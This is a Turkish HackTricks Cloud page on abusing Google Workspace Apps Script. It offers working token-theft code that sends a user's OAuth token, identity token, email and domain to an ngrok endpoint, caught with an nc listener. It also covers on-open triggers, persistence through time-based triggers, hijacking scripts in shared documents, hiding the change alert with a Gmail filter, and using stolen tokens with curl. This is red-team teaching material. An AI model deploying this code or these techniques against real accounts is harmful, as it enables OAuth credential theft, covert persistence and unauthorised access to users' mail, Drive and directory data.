# GWS - App Scripts

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## App Scripts

App Scripts, **kodun, App Script'in bağlı olduğu belgeye erişen düzenleyici iznine sahip bir kullanıcı tarafından tetikleneceği ve OAuth onayını kabul ettikten sonra çalıştırılacağı kodlardır**.\
Ayrıca sahibi tarafından belirli aralıklarla **çalıştırılacak şekilde de ayarlanabilirler** (Kalıcılık).

### App Script Oluşturma

App Script oluşturmanın birkaç yolu vardır, ancak en yaygın olanları **herhangi bir türdeki bir Google Belgesinden** ve **bağımsız bir proje olarak** oluşturmaktır:

<details>

<summary>Google Docs, Sheets veya Slides'dan bağlı bir proje oluşturma</summary>

1. Bir Docs belgesi, bir Sheets elektronik tablosu veya bir Slides sunumu açın.
2. **Uzantılar** > **Google Apps Script**'i tıklayın.
3. Betik düzenleyicide, **Başlıksız proje**'yi tıklayın.
4. Projenize bir ad verin ve **Yeniden Adlandır**'ı tıklayın.

</details>

<details>

<summary>Bağımsız bir proje oluşturma</summary>

Apps Script'ten bağımsız bir proje oluşturmak için:

1. [`script.google.com`](https://script.google.com/) adresine gidin.
2. **Yeni Proje Ekle**'yi tıklayın.
3. Betik düzenleyicide, **Başlıksız proje**'yi tıklayın.
4. Projenize bir ad verin ve **Yeniden Adlandır**'ı tıklayın.

</details>

<details>

<summary>Google Drive'dan bağımsız bir proje oluşturma</summary>

1. [Google Drive](https://drive.google.com/) adresini açın.
2. **Yeni** > **Daha Fazla** > **Google Apps Script**'i tıklayın.

</details>

<details>

<summary>Google Forms'tan bağlı bir proje oluşturma</summary>

1. Google Forms'ta bir form açın.
2. Daha Fazla more\_vert > **Betik Düzenleyici**'ni tıklayın.
3. Betik düzenleyicide, **Başlıksız proje**'yi tıklayın.
4. Projenize bir ad verin ve **Yeniden Adlandır**'ı tıklayın.

</details>

<details>

<summary>clasp komut satırı aracını kullanarak bağımsız bir proje oluşturma</summary>

`clasp`, terminalden Apps Script projeleri oluşturmanıza, çekmenize/itmekmenize ve dağıtmanıza olanak tanıyan bir komut satırı aracıdır.

Daha fazla ayrıntı için [clasp kullanarak Komut Satırı Arayüzü kılavuzunu](https://developers.google.com/apps-script/guides/clasp) inceleyin.

</details>

## App Script Senaryosu <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Script ile Google Sheet Oluşturma

Bir App Script oluşturmaya başlamak için, bu senaryo için bir Google Sheet oluşturmanızı öneririm ve **`Uzantılar > App Scripts`'e gidin**, bu size bağlı bir **yeni App Script açacaktır**.

### Token sızdırma

OAuth belirteci erişimini vermek için **`Hizmetler +`'ı tıklayın ve şu gibi kapsamlar ekleyin**:

* **AdminDirectory**: Dizin kullanıcılarına ve gruplarına erişim (kullanıcı yeterli izinlere sahipse)
* **Gmail**: Gmail verilerine erişim için
* **Drive**: Drive verilerine erişim için
* **Google Sheets API**: Tetikleyiciyle çalışması için

**Gerekli kapsamları** kendiniz değiştirmek için projenin ayarlarına gidip: **`Düzenleyicide "appsscript.json" manifest dosyasını göster`'i etkinleştirin.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

İsteği yakalamak için sadece şunu çalıştırabilirsiniz:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
İzinlerin istendiği App Script'i çalıştırmak için:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Harici bir istek yapıldığında OAuth uyarısı aynı zamanda **harici uç noktalara erişim izni** isteyecektir.
{% endhint %}

### Tetikleyici Oluşturma

App okunduğunda, tetikleyici oluşturmak için **⏰ Tetikleyiciler** üzerine tıklayın. **Fonksiyon** olarak **`getToken`**'ı seçin, dağıtımda çalışacak şekilde **`Head`**'i, olay kaynağı olarak **`Tablodan`** ve olay türünü **`Açıldığında`** veya **`Düzenlendiğinde`** (ihtiyacınıza göre) seçin ve kaydedin.

App Script'in **çalışmalarını hata ayıklamak isterseniz, Uygulamaları sekmesinde çalışmaları kontrol edebilirsiniz**.

### Paylaşım

App Script'i **tetiklemek** için kurbanın **Düzenleyici Erişimi** ile bağlantı kurması gerekmektedir.

{% hint style="success" %}
App Script'i çalıştırmak için kullanılan **token**, tetikleyiciyi oluşturan kişinin **token**'ı olacaktır, dosya diğer kullanıcılar tarafından Düzenleyici olarak açılsa bile.
{% endhint %}

### Benimle Paylaşılan Belgelerin Kötüye Kullanımı

{% hint style="danger" %}
Eğer birisi size App Script'ler ve App Script'in **Head**'ini kullanan bir tetikleyici içeren bir belge paylaştıysa, App Script kodunu değiştirebilir (örneğin, token çalma fonksiyonlarını ekleyebilir), buna erişebilir ve **App Script, belgeyi sizinle paylaşan kullanıcının izinleriyle çalıştırılacaktır**! (unutmayın ki sahibin OAuth token'ı, tetikleyici oluşturulurken verilen erişim kapsamlarına sahip olacaktır).

Birisi betiği değiştirdiğinde, betiği oluşturan kişiye bir **bildirim gönderilecektir** (Uyarıyı önlemek için bir filtre oluşturmak için gmail izinlerini kullanmak ne dersiniz?)
{% endhint %}

{% hint style="success" %}
Eğer bir **saldırgan App Script'in kapsamlarını değiştirirse**, güncellemeler belgeye **uygulanmayacaktır** ta ki değişikliklerle yeni bir tetikleyici oluşturulana kadar. Bu nedenle, bir saldırgan, oluşturduğu tetikleyicide belirlediği kapsamlardan daha fazla kapsama sahip sahibin oluşturucu token'ını çalamayacaktır.
{% endhint %}

### Paylaşmak Yerine Kopyalamak

Bir belgeyi paylaşmak için bir bağlantı oluşturduğunuzda şöyle bir bağlantı oluşturulur: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Eğer sonundaki **"/edit"**'i **"/copy"** ile değiştirirseniz, google'a erişmek yerine size belgenin bir kopyasını oluşturup oluşturmak isteyip istemediğinizi soracaktır:

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Kullanıcı kopyaladığında, hem **belgenin içeriği hem de App Script'ler kopyalanacaktır**, ancak **tetikleyiciler kopyalanmayacaktır**, bu nedenle **hiçbir şey çalıştırılmayacaktır**.

### Web Uygulaması Olarak Paylaşma

Bir App Script'i **Web uygulaması olarak paylaşmak** da mümkündür (App Script'in Düzenleyicisi'nde bir Web uygulaması olarak dağıtın), ancak şu gibi bir uyarı görünecektir:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Gerekli izinleri isteyen **tipik OAuth uyarısının ardından** devam edin.

### Test Etme

Toplanan bir token'ı e-postaları listelemek için test edebilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Kullanıcının takvimini listele:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Uygulama Betiği Olarak Kalıcılık

Kalıcılık için bir seçenek, **bir belge oluşturmak ve getToken işlevi için bir tetikleyici eklemek ve belgeyi saldırganla paylaşmak** olabilir, böylece saldırgan her dosyayı açtığında **kurbanın belirteci dışa aktarılır.**

Ayrıca bir Uygulama Betiği oluşturmak ve her X süre (örneğin her dakika, saat, gün...) için tetikleyici yapmak da mümkündür. Bir saldırgan, **kompromize edilmiş kimlik bilgilerine veya bir kurbanın oturumuna sahipse bir Uygulama Betiği zaman tetikleyicisi ayarlayabilir ve her gün çok ayrıcalıklı bir OAuth belirteci sızdırabilir**:

Sadece bir Uygulama Betiği oluşturun, Tetikleyicilere gidin, Tetikleyici Ekle'yi tıklayın ve olay kaynağı olarak Zaman tabanlı seçin ve size en uygun seçenekleri seçin:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Bu, bu konuda bir güvenlik uyarısı e-postası ve bir itme mesajı oluşturacak ve bunun hakkında sizi bilgilendirecektir.
{% endhint %}

### Paylaşılan Belge Doğrulanmamış İzin Geçişi

Dahası, biri size **düzenleyici erişimi ile bir belge paylaştıysa**, belge içinde **Uygulama Betikleri oluşturabilir** ve belgenin **SAHİBİ (oluşturan) Uygulama Betiğinin sahibi olacaktır**.

{% hint style="warning" %}
Bu, **belge oluşturanın, belge içinde düzenleyici erişimi olan herhangi bir Uygulama Betiği oluşturanın oluşturucusu olarak görüneceği anlamına gelir.

Bu ayrıca, belge oluşturanın **Workspace ortamı tarafından Uygulama Betiğine güvenileceği anlamına gelir.**
{% endhint %}

{% hint style="danger" %}
Bu ayrıca, eğer bir **Uygulama Betiği zaten varsa** ve insanlar **erişim vermişse**, belgedeki **Düzenleyici** iznine sahip herhangi biri **bunu değiştirebilir ve bu erişimi kötüye kullanabilir.**\
Bunu kötüye kullanmak için insanların Uygulama Betiğini tetiklemeleri gerekir. Ve bir hileli yöntem de **betiği bir web uygulaması olarak yayınlamaktır**. İnsanlar, Uygulama Betiğine zaten **erişim vermişse** ve web sayfasına erişirlerse, Uygulama Betiğini **tetikleyeceklerdir** (bu ayrıca `<img>` etiketleri kullanılarak da çalışır).
{% endhint %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
{% endhint %}
